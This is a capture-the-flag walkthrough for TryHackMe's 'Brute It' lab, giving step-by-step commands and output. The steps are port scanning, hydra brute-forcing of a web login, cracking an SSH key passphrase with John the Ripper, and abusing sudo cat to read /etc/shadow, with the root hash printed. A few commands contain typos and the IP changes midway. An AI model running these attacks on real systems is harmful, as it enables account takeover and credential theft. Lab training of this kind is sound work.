# Brute-it-CTF
https://tryhackme.com/room/bruteit

**Use sudo nmap to scan for open ports: sudo nmap -sS 10.10.254.49**

	PORT   STATE SERVICE

	22/tcp open  ssh

	80/tcp open  http

**Use dirb tool to uncover hidden directories on the web server:**

	==> DIRECTORY: http://10.10.254.49/admin/

Inspect the page and following clue will apear:

	<!-- Hey john, if you do not remember, the username is admin -->

*john could be a SSH username*

Do a failed login attemt while inspecting the page, head to the network tab and then to the request tab. Click on the request payload to see the format used.

**Use hydra to bruteforce the login page:** 

**hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.254.49 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"**

	80][http-post-form] host: 10.10.254.49   login: admin   password: ******

Login to form page and the web flag will be shown and also a private RSA key

Copy the rsa key to a text file > ida_rsa

**locate ssh2john and cp to your current folder and excute the program - python sshjohn.py ida_rsa > id_rsa.hash**

**Crack the hash with: sudo john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt**

	rockinroll       (ida_rsa)
	  

ssh to the user john with the rsa key and passphrase: sh -i ida_rsa john@10.10.239.162 

cat user.txt to find for the flag

sudo -l to check what commands we can run with sudo:

	 (root) NOPASSWD: /bin/cat

sudo cat /root/root.txt will get you the final flag

sudo cat /etc/shadow and copy the root password hash:

	root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::

**Use johntheripper to crack the hash: john -w=/usr/share/wordlists/rockyou.txt roothash**

The root password is found 



